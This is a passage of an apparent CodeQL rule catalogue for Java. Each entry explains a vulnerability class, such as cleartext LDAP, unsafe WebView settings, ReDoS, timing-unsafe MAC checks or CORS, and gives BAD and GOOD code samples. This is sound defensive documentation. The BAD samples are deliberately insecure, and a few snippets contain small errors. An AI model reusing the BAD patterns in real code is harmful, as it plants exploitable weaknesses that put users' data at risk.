    "help": "# Insecure LDAP authentication\nWhen using the Java LDAP API to perform LDAPv3-style extended operations and controls, a context with connection properties including user credentials is started. Transmission of LDAP credentials in cleartext allows remote attackers to obtain sensitive information by sniffing the network.\n\n\n## Recommendation\nUse the `ldaps://` protocol to send credentials through SSL or use SASL authentication.\n\n\n## Example\nIn the following (bad) example, a `ldap://` URL is used and credentials will be sent in plaintext.\n\n\n```java\nString ldapUrl = \"ldap://ad.your-server.com:389\";\nHashtable<String, String> environment = new Hashtable<String, String>();\nenvironment.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenvironment.put(Context.PROVIDER_URL, ldapUrl);\nenvironment.put(Context.REFERRAL, \"follow\");\nenvironment.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenvironment.put(Context.SECURITY_PRINCIPAL, ldapUserName);\nenvironment.put(Context.SECURITY_CREDENTIALS, password);\nDirContext dirContext = new InitialDirContext(environment);\n\n```\nIn the following (good) example, a `ldaps://` URL is used so credentials will be encrypted with SSL.\n\n\n```java\nString ldapUrl = \"ldaps://ad.your-server.com:636\";\nHashtable<String, String> environment = new Hashtable<String, String>();\nenvironment.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenvironment.put(Context.PROVIDER_URL, ldapUrl);\nenvironment.put(Context.REFERRAL, \"follow\");\nenvironment.put(Context.SECURITY_AUTHENTICATION, \"simple\");\nenvironment.put(Context.SECURITY_PRINCIPAL, ldapUserName);\nenvironment.put(Context.SECURITY_CREDENTIALS, password);\nDirContext dirContext = new InitialDirContext(environment);\n\n```\nIn the following (good) example, a `ldap://` URL is used, but SASL authentication is enabled so that the credentials will be encrypted.\n\n\n```java\nString ldapUrl = \"ldap://ad.your-server.com:389\";\nHashtable<String, String> environment = new Hashtable<String, String>();\nenvironment.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\nenvironment.put(Context.PROVIDER_URL, ldapUrl);\nenvironment.put(Context.REFERRAL, \"follow\");\nenvironment.put(Context.SECURITY_AUTHENTICATION, \"DIGEST-MD5 GSSAPI\");\nenvironment.put(Context.SECURITY_PRINCIPAL, ldapUserName);\nenvironment.put(Context.SECURITY_CREDENTIALS, password);\nDirContext dirContext = new InitialDirContext(environment);\n\n```\n\n## References\n* Oracle: [LDAP and LDAPS URLs](https://docs.oracle.com/javase/jndi/tutorial/ldap/misc/url.html)\n* Oracle: [Simple authentication](https://docs.oracle.com/javase/tutorial/jndi/ldap/simple.html)\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n"
  },
  "java/android/websettings-allow-content-access": {
    "name": "Android WebView settings allows access to content links",
    "id": "java/android/websettings-allow-content-access",
    "description": "Access to content providers in a WebView can allow access to protected information by loading content:// links.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "medium",
    "security-severity": 6.5,
    "tags": [
      "security",
      "external/cwe/cwe-200"
    ],
    "filename": "c79ca7dc-AndroidWebViewSettingsAllowsContentAccess",
    "language": "java",
    "help": "# Android WebView settings allows access to content links\nAndroid can provide access to content providers within a WebView using the `setAllowContentAccess` setting.\n\nAllowing access to content providers via `content://` URLs may allow JavaScript to access protected content.\n\n\n## Recommendation\nIf your app does not require access to the `content://` URL functionality, you should explicitly disable the setting by calling `setAllowContentAccess(false)` on the settings of the WebView.\n\n\n## Example\nIn the following (bad) example, access to `content://` URLs is explicitly allowed.\n\n\n```java\nWebSettings settings = webview.getSettings();\n\nsettings.setAllowContentAccess(true);\n\n```\nIn the following (good) example, access to `content://` URLs is explicitly denied.\n\n\n```java\nWebSettings settings = webview.getSettings();\n\nsettings.setAllowContentAccess(false);\n\n```\n\n## References\n* Android Documentation: [setAllowContentAccess](https://developer.android.com/reference/android/webkit/WebSettings#setAllowContentAccess(boolean)).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "java/uncontrolled-arithmetic": {
    "name": "Uncontrolled data in arithmetic expression",
    "description": "Arithmetic operations on uncontrolled data that is not validated can cause overflows.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.6,
    "precision": "medium",
    "id": "java/uncontrolled-arithmetic",
    "tags": [
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-191"
    ],
    "filename": "47e93059-ArithmeticUncontrolled",
    "language": "java",
    "help": "# Uncontrolled data in arithmetic expression\nPerforming calculations on uncontrolled data can result in integer overflows unless the input is validated.\n\nIf the data is not under your control, and can take extremely large values, even arithmetic operations that would usually result in a small change in magnitude may result in overflows.\n\n\n## Recommendation\nAlways guard against overflow in arithmetic operations on uncontrolled data by doing one of the following:\n\n* Validate the data.\n* Define a guard on the arithmetic expression, so that the operation is performed only if the result can be known to be less than, or equal to, the maximum value for the type, for example `MAX_VALUE`.\n* Use a wider type, so that larger input values do not cause overflow.\n\n## Example\nIn this example, a random integer is generated. Because the value is not controlled by the programmer, it could be extremely large. Performing arithmetic operations on this value could therefore cause an overflow. To avoid this happening, the example shows how to perform a check before performing a multiplication.\n\n\n```java\nclass Test {\n\tpublic static void main(String[] args) {\n\t\t{\n\t\t\tint data = (new java.security.SecureRandom()).nextInt();\n\n\t\t\t// BAD: may overflow if data is large\n\t\t\tint scaled = data * 10;\n\n\t\t\t// ...\n\n\t\t\t// GOOD: use a guard to ensure no overflows occur\n\t\t\tint scaled2;\n\t\t\tif (data < Integer.MAX_VALUE/10)\n\t\t\t\tscaled2 = data * 10;\n\t\t\telse \n\t\t\t\tscaled2 = Integer.MAX_VALUE;\n\t\t}\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [NUM00-J. Detect or prevent integer overflow](https://wiki.sei.cmu.edu/confluence/display/java/NUM00-J.+Detect+or+prevent+integer+overflow).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "java/improper-validation-of-array-construction": {
    "name": "Improper validation of user-provided size used for array construction",
    "description": "Using unvalidated external input as the argument to a construction of an array can lead to index out of bound exceptions.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "java/improper-validation-of-array-construction",
    "tags": [
      "security",
      "external/cwe/cwe-129"
    ],
    "filename": "e2275c9e-ImproperValidationOfArrayConstruction",
    "language": "java",
    "help": "# Improper validation of user-provided size used for array construction\nUsing unvalidated input when specifying the size of a newly created array can result in the creation of an array with size zero. If this array is subsequently accessed without further checks, an `ArrayIndexOutOfBoundsException` may be thrown, because there is no guarantee that the array is not empty.\n\nThis problem occurs when user input is used as the size during array initialization, either directly or following one or more calculations. If the user input is unvalidated, it may cause the size of the array to be zero.\n\n\n## Recommendation\nThe size used in the array initialization should be verified to be greater than zero before being used. Alternatively, the array access may be protected by a conditional check that ensures it is only accessed if the index is less than the array size.\n\n\n## Example\nThe following program constructs an array with the size specified by some user input:\n\n\n```java\npublic class ImproperValidationOfArrayIndex extends HttpServlet {\n\n  protected void doGet(HttpServletRequest request, HttpServletResponse response)\n  throws ServletException, IOException {\n    try {\n      // User provided value\n      int numberOfItems = Integer.parseInt(request.getParameter(\"numberOfItems\").trim());\n\n      if (numberOfItems >= 0) {\n        /*\n         * BAD numberOfItems may be zero, which would cause the array indexing operation to\n         * throw an ArrayIndexOutOfBoundsException\n         */\n        String items = new String[numberOfItems];\n        items[0] = \"Item 1\";\n      }\n\n      if (numberOfItems > 0) {\n        /*\n         * GOOD numberOfItems must be greater than zero, so the indexing succeeds.\n         */\n        String items = new String[numberOfItems];\n        items[0] = \"Item 1\";\n      }\n\n    } catch (NumberFormatException e) { }\n  }\n}\n```\nThe first array construction is protected by a condition that checks if the user input is zero or more. However, if the user provides `0` as the `numberOfItems` parameter, then an empty array is created, and any array access would fail with an `ArrayIndexOutOfBoundsException`.\n\nThe second array construction is protected by a condition that checks if the user input is greater than zero. The array will therefore never be empty, and the following array access will not throw an `ArrayIndexOutOfBoundsException`.\n\n\n## References\n* Java API Specification: [ArrayIndexOutOfBoundsException](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ArrayIndexOutOfBoundsException.html).\n* Common Weakness Enumeration: [CWE-129](https://cwe.mitre.org/data/definitions/129.html).\n"
  },
  "java/polynomial-redos": {
    "name": "Polynomial regular expression used on uncontrolled data",
    "description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/polynomial-redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "3a0d1a85-PolynomialReDoS",
    "language": "java",
    "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine provided by Java uses a backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\nNote that Java versions 9 and above have some mitigations against ReDoS; however they aren't perfect and more complex regular expressions can still be affected by this problem.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter. Alternatively, an alternate regex library that guarantees linear time execution, such as Google's RE2J, may be used.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```java\n\nPattern.compile(\"^\\\\s+|\\\\s+$\").matcher(text).replaceAll(\"\") // BAD\n```\nThe sub-expression `\"\\\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`\"^\\\\s+|(?<!\\\\s)\\\\s+$\"`), or just by using the built-in trim method (`text.trim()`).\n\nNote that the sub-expression `\"^\\\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```java\n\n\"^0\\\\.\\\\d+E?\\\\d+$\"\" \n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `\"^0\\\\.\\\\d+(E\\\\d+)?$\"`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```java\n\nPattern.matches(\"^(\\\\+|-)?(\\\\d+|(\\\\d*\\\\.\\\\d*))?(E|e)?([-+])?(\\\\d+)?$\", str); \n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```java\n\nif (str.length() > 1000) {\n    throw new IllegalArgumentException(\"Input too long\");\n}\n\nPattern.matches(\"^(\\\\+|-)?(\\\\d+|(\\\\d*\\\\.\\\\d*))?(E|e)?([-+])?(\\\\d+)?$\", str); \n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "java/cleartext-storage-in-cookie": {
    "name": "Cleartext storage of sensitive information in cookie",
    "description": "Storing sensitive information in cleartext can expose it to an attacker.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 5.0,
    "precision": "high",
    "id": "java/cleartext-storage-in-cookie",
    "tags": [
      "security",
      "external/cwe/cwe-315"
    ],
    "filename": "c3bb55c3-CleartextStorageCookie",
    "language": "java",
    "help": "# Cleartext storage of sensitive information in cookie\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored. It may be wise to encrypt information before it is put into a heap data structure (such as `Java.util.Properties`) that may be written to disk later. Objects that are serializable or marshallable should also always contain encrypted information unless you are certain that they are not ever going to be serialized.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\n\n## Example\nThe following example shows two ways of storing user credentials in a cookie. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the credentials are hashed before storing them.\n\n\n```java\npublic static void main(String[] args) {\n\t{\n\t\tString data;\n\t\tPasswordAuthentication credentials =\n\t\t\t\tnew PasswordAuthentication(\"user\", \"BP@ssw0rd\".toCharArray());\n\t\tdata = credentials.getUserName() + \":\" + new String(credentials.getPassword());\n\t\n\t\t// BAD: store data in a cookie in cleartext form\n\t\tresponse.addCookie(new Cookie(\"auth\", data));\n\t}\n\t\n\t{\n\t\tString data;\n\t\tPasswordAuthentication credentials =\n\t\t\t\tnew PasswordAuthentication(\"user\", \"GP@ssw0rd\".toCharArray());\n\t\tString salt = \"ThisIsMySalt\";\n\t\tMessageDigest messageDigest = MessageDigest.getInstance(\"SHA-512\");\n\t\tmessageDigest.reset();\n\t\tString credentialsToHash =\n\t\t\t\tcredentials.getUserName() + \":\" + credentials.getPassword();\n\t\tbyte[] hashedCredsAsBytes =\n\t\t\t\tmessageDigest.digest((salt+credentialsToHash).getBytes(\"UTF-8\"));\n\t\tdata = bytesToString(hashedCredsAsBytes);\n\t\t\n\t\t// GOOD: store data in a cookie in encrypted form\n\t\tresponse.addCookie(new Cookie(\"auth\", data));\n\t}\n}\n\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n"
  },
  "java/android/unsafe-android-webview-fetch": {
    "name": "Unsafe resource fetching in Android WebView",
    "description": "JavaScript rendered inside WebViews can access protected application files and web resources from any origin exposing them to attack.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "medium",
    "id": "java/android/unsafe-android-webview-fetch",
    "tags": [
      "security",
      "external/cwe/cwe-749",
      "external/cwe/cwe-079"
    ],
    "filename": "6b56f7ae-UnsafeAndroidAccess",
    "language": "java",
    "help": "# Unsafe resource fetching in Android WebView\nAndroid WebViews that allow externally controlled URLs to be loaded, and whose JavaScript interface is enabled, are potentially vulnerable to cross-site scripting and sensitive resource disclosure attacks.\n\nA `WebView` whose `WebSettings` object has called `setAllowFileAccessFromFileURLs(true)` or `setAllowUniversalAccessFromFileURLs(true)` must not load any untrusted web content.\n\nEnabling these settings allows malicious scripts loaded in a `file://` context to launch cross-site scripting attacks, accessing arbitrary local files including WebView cookies, session tokens, private app data or even credentials used on arbitrary web sites.\n\nThis query detects the following two scenarios:\n\n1. A vulnerability introduced by WebViews when JavaScript is enabled and remote inputs are allowed.\n1. A more severe vulnerability when \"allow cross-origin resource access\" is also enabled. This setting was deprecated in API level 30 (Android 11), but most devices are still affected, especially since some Android phones are updated slowly or no longer updated at all.\n\n## Recommendation\nOnly allow trusted web content to be displayed in WebViews when JavaScript is enabled. Disallow cross-origin resource access in WebSettings to reduce the attack surface.\n\n\n## Example\nThe following example shows both 'BAD' and 'GOOD' configurations. In the 'BAD' configuration, JavaScript and the allow access setting are enabled and URLs are loaded from externally controlled inputs. In the 'GOOD' configuration, JavaScript is disabled or only trusted web content is allowed to be loaded.\n\n\n```java\npublic class UnsafeAndroidAccess extends Activity {\n\tpublic void onCreate(Bundle savedInstanceState) {\n\t\tsuper.onCreate(savedInstanceState);\n\t\tsetContentView(R.layout.webview);\n\n\t\t// BAD: Have both JavaScript and cross-origin resource access enabled in webview while\n\t\t// taking remote user inputs\n\t\t{\n\t\t\tWebView wv = (WebView) findViewById(R.id.my_webview);\n\t\t\tWebSettings webSettings = wv.getSettings();\n\n\t\t\twebSettings.setJavaScriptEnabled(true);\n\t\t\twebSettings.setAllowUniversalAccessFromFileURLs(true);\n\n\t\t\twv.setWebViewClient(new WebViewClient() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean shouldOverrideUrlLoading(WebView view, String url) {\n\t\t\t\t\tview.loadUrl(url);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});\n\n\t\t\tString thisUrl = getIntent().getExtras().getString(\"url\"); // dangerous remote input from  the intent's Bundle of extras\n\t\t\twv.loadUrl(thisUrl);\n\t\t}\n\n\t\t// BAD: Have both JavaScript and cross-origin resource access enabled in webview while\n\t\t// taking remote user inputs\n\t\t{\n\t\t\tWebView wv = (WebView) findViewById(R.id.my_webview);\n\t\t\tWebSettings webSettings = wv.getSettings();\n\n\t\t\twebSettings.setJavaScriptEnabled(true);\n\t\t\twebSettings.setAllowUniversalAccessFromFileURLs(true);\n\n\t\t\twv.setWebViewClient(new WebViewClient() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean shouldOverrideUrlLoading(WebView view, String url) {\n\t\t\t\t\tview.loadUrl(url);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});\n\n\t\t\tString thisUrl = getIntent().getStringExtra(\"url\"); //dangerous remote input from intent extra\n\t\t\twv.loadUrl(thisUrl);\n\t\t}\n\n\t\t// GOOD: Have JavaScript and cross-origin resource access disabled by default on modern Android (Jellybean+) while taking remote user inputs\n\t\t{\n\t\t\tWebView wv = (WebView) findViewById(-1);\n\t\t\tWebSettings webSettings = wv.getSettings();\n\n\t\t\twv.setWebViewClient(new WebViewClient() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean shouldOverrideUrlLoading(WebView view, String url) {\n\t\t\t\t\tview.loadUrl(url);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});\n\n\t\t\tString thisUrl = getIntent().getExtras().getString(\"url\"); // remote input\n\t\t\twv.loadUrl(thisUrl);\n\t\t}\n\n\t\t// GOOD: Have JavaScript enabled in webview but remote user input is not allowed\n\t\t{\n\t\t\tWebView wv = (WebView) findViewById(-1);\n\t\t\tWebSettings webSettings = wv.getSettings();\n\n\t\t\twebSettings.setJavaScriptEnabled(true);\n\n\t\t\twv.setWebViewClient(new WebViewClient() {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean shouldOverrideUrlLoading(WebView view, String url) {\n\t\t\t\t\tview.loadUrl(url);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t});\n\n\t\t\twv.loadUrl(\"https://www.mycorp.com\");\n\t\t}\n\t}\n}\n```\n\n## References\n* Google Help: [Fixing a File-based XSS Vulnerability](https://support.google.com/faqs/answer/7668153?hl=en)\n* OWASP: [Testing JavaScript Execution in WebViews (MSTG-PLATFORM-5)](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-javascript-execution-in-webviews-mstg-platform-5)\n* OWASP: [Testing WebView Protocol Handlers (MSTG-PLATFORM-6)](https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-webview-protocol-handlers-mstg-platform-6)\n* Common Weakness Enumeration: [CWE-749](https://cwe.mitre.org/data/definitions/749.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n"
  },
  "java/relative-path-command": {
    "name": "Executing a command with a relative path",
    "description": "Executing a command with a relative path is vulnerable to malicious changes in the PATH environment variable.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.4,
    "precision": "medium",
    "id": "java/relative-path-command",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "f03693da-ExecRelative",
    "language": "java",
    "help": "# Executing a command with a relative path\nWhen a command is executed with a relative path, the runtime uses the PATH environment variable to find which executable to run. Therefore, any user who can change the PATH environment variable can cause the software to run a different, malicious executable.\n\n\n## Recommendation\nIn most cases, simply use a command that has an absolute path instead of a relative path.\n\nIn some cases, the location of the executable might be different on different installations. In such cases, consider specifying the location of key executables with some form of configuration. When using this approach, be careful that the configuration system is not itself vulnerable to malicious modifications.\n\n\n## Example\n\n```java\nclass Test {\n    public static void main(String[] args) {\n        // BAD: relative path\n        Runtime.getRuntime().exec(\"make\");\n        \n        // GOOD: absolute path\n        Runtime.getRuntime().exec(\"/usr/bin/make\");\n\n        // GOOD: build an absolute path from known values\n        Runtime.getRuntime().exec(Paths.MAKE_PREFIX + \"/bin/make\");\n    }\n}\n```\n\n## References\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "java/azure-storage/unsafe-client-side-encryption-in-use": {
    "name": "Unsafe usage of v1 version of Azure Storage client-side encryption (CVE-2022-30187).",
    "description": "Unsafe usage of v1 version of Azure Storage client-side encryption, please refer to http://aka.ms/azstorageclientencryptionblog",
    "kind": "problem",
    "tags": [
      "security",
      "cryptography",
      "external/cwe/cwe-327"
    ],
    "id": "java/azure-storage/unsafe-client-side-encryption-in-use",
    "problem.severity": "error",
    "precision": "high",
    "filename": "4c2ece7b-UnsafeUsageOfClientSideEncryptionVersion",
    "language": "java",
    "help": "# Unsafe usage of v1 version of Azure Storage client-side encryption (CVE-2022-30187).\nAzure Storage .NET, Java, and Python SDKs support encryption on the client with a customer-managed key that is maintained in Azure Key Vault or another key store.\n\nThe Azure Storage SDK version 12.18.0 or later supports version `V2` for client-side encryption. All previous versions of Azure Storage SDK only support client-side encryption `V1` which is unsafe.\n\n\n## Recommendation\nConsider switching to `V2` client-side encryption.\n\n\n## Example\n\n```java\n\n// BAD: Using an outdated SDK that does not support client side encryption version V2_0\nnew EncryptedBlobClientBuilder()\n        .blobClient(blobClient)\n        .key(resolver.buildAsyncKeyEncryptionKey(keyid).block(), keyWrapAlgorithm)\n        .buildEncryptedBlobClient()\n        .uploadWithResponse(new BlobParallelUploadOptions(data)\n                        .setMetadata(metadata)\n                        .setHeaders(headers)\n                        .setTags(tags)\n                        .setTier(tier)\n                        .setRequestConditions(requestConditions)\n                        .setComputeMd5(computeMd5)\n                        .setParallelTransferOptions(parallelTransferOptions),\n                timeout, context);\n\n// BAD: Using the deprecatedd client side encryption version V1_0\nnew EncryptedBlobClientBuilder(EncryptionVersion.V1)\n        .blobClient(blobClient)\n        .key(resolver.buildAsyncKeyEncryptionKey(keyid).block(), keyWrapAlgorithm)\n        .buildEncryptedBlobClient()\n        .uploadWithResponse(new BlobParallelUploadOptions(data)\n                        .setMetadata(metadata)\n                        .setHeaders(headers)\n                        .setTags(tags)\n                        .setTier(tier)\n                        .setRequestConditions(requestConditions)\n                        .setComputeMd5(computeMd5)\n                        .setParallelTransferOptions(parallelTransferOptions),\n                timeout, context);\n\n\n// GOOD: Using client side encryption version V2_0\nnew EncryptedBlobClientBuilder(EncryptionVersion.V2)\n        .blobClient(blobClient)\n        .key(resolver.buildAsyncKeyEncryptionKey(keyid).block(), keyWrapAlgorithm)\n        .buildEncryptedBlobClient()\n        .uploadWithResponse(new BlobParallelUploadOptions(data)\n                        .setMetadata(metadata)\n                        .setHeaders(headers)\n                        .setTags(tags)\n                        .setTier(tier)\n                        .setRequestConditions(requestConditions)\n                        .setComputeMd5(computeMd5)\n                        .setParallelTransferOptions(parallelTransferOptions),\n                timeout, context);\n\n```\n\n## References\n* [Azure Storage Client Encryption Blog.](http://aka.ms/azstorageclientencryptionblog)\n* [CVE-2022-30187](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30187)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "java/possible-timing-attack-against-signature": {
    "name": "Possible timing attack against signature validation",
    "description": "When checking a signature over a message, a constant-time algorithm should be used. Otherwise, there is a risk of a timing attack that allows an attacker to forge a valid signature for an arbitrary message. For a successful attack, the attacker has to be able to send to the validation procedure both the message and the signature.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/possible-timing-attack-against-signature",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-208"
    ],
    "filename": "36269823-PossibleTimingAttackAgainstSignature",
    "language": "java",
    "help": "# Possible timing attack against signature validation\nA constant-time algorithm should be used for checking a MAC or a digital signature. In other words, the comparison time should not depend on the content of the input. Otherwise, an attacker may be able to forge a valid signature for an arbitrary message by running a timing attack if they can send to the validation procedure both the message and the signature. A successful attack can result in authentication bypass.\n\n\n## Recommendation\nUse `MessageDigest.isEqual()` method to check MACs and signatures. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays.\n\n\n## Example\nThe following example uses `Arrays.equals()` method for validating a MAC over a message. This method implements a non-constant-time algorithm. Both the message and the signature come from an untrusted HTTP request:\n\n\n```java\npublic boolean validate(HttpRequest request, SecretKey key) throws Exception {\n    byte[] message = getMessageFrom(request);\n    byte[] signature = getSignatureFrom(request);\n\n    Mac mac = Mac.getInstance(\"HmacSHA256\");\n    mac.init(new SecretKeySpec(key.getEncoded(), \"HmacSHA256\"));\n    byte[] actual = mac.doFinal(message);\n    return Arrays.equals(signature, actual);\n}\n```\nThe next example uses a safe constant-time algorithm for validating a MAC:\n\n\n```java\npublic boolean validate(HttpRequest request, SecretKey key) throws Exception {\n    byte[] message = getMessageFrom(request);\n    byte[] signature = getSignatureFrom(request);\n\n    Mac mac = Mac.getInstance(\"HmacSHA256\");\n    mac.init(new SecretKeySpec(key.getEncoded(), \"HmacSHA256\"));\n    byte[] actual = mac.doFinal(message);\n    return MessageDigest.isEqual(signature, actual);\n}\n```\n\n## References\n* Wikipedia: [Timing attack](https://en.wikipedia.org/wiki/Timing_attack).\n* Coursera: [Timing attacks on MAC verification](https://www.coursera.org/lecture/crypto/timing-attacks-on-mac-verification-FHGW1)\n* NCC Group: [Time Trial: Racing Towards Practical Remote Timing Attacks](https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/TimeTrial.pdf)\n* Java API Specification: [MessageDigest.isEqual() method](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/security/MessageDigest.html#isEqual(byte[],byte[]))\n* Common Weakness Enumeration: [CWE-208](https://cwe.mitre.org/data/definitions/208.html).\n"
  },
  "java/unvalidated-cors-origin-set": {
    "name": "CORS is derived from untrusted input",
    "description": "CORS header is derived from untrusted input, allowing a remote user to control which origins are trusted.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unvalidated-cors-origin-set",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-346"
    ],
    "filename": "c36323ba-UnvalidatedCors",
    "language": "java",
    "help": "# CORS is derived from untrusted input\nA server can send the `Access-Control-Allow-Credentials` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.\n\nWhen the `Access-Control-Allow-Credentials` header is `true`, the `Access-Control-Allow-Origin` header must have a value different from `*` in order for browsers to accept the header. Therefore, to allow multiple origins for cross-origin requests with credentials, the server must dynamically compute the value of the `Access-Control-Allow-Origin` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.\n\n\n## Recommendation\nWhen the `Access-Control-Allow-Credentials` header value is `true`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.\n\nSince the `null` origin is easy to obtain for an attacker, it is never safe to use `null` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `true`.A null origin can be set by an attacker using a sandboxed iframe. A more detailed explanation is available in the portswigger blogpost referenced below.\n\n\n## Example\nIn the example below, the server allows the browser to send user credentials in a cross-origin request. The request header `origins` controls the 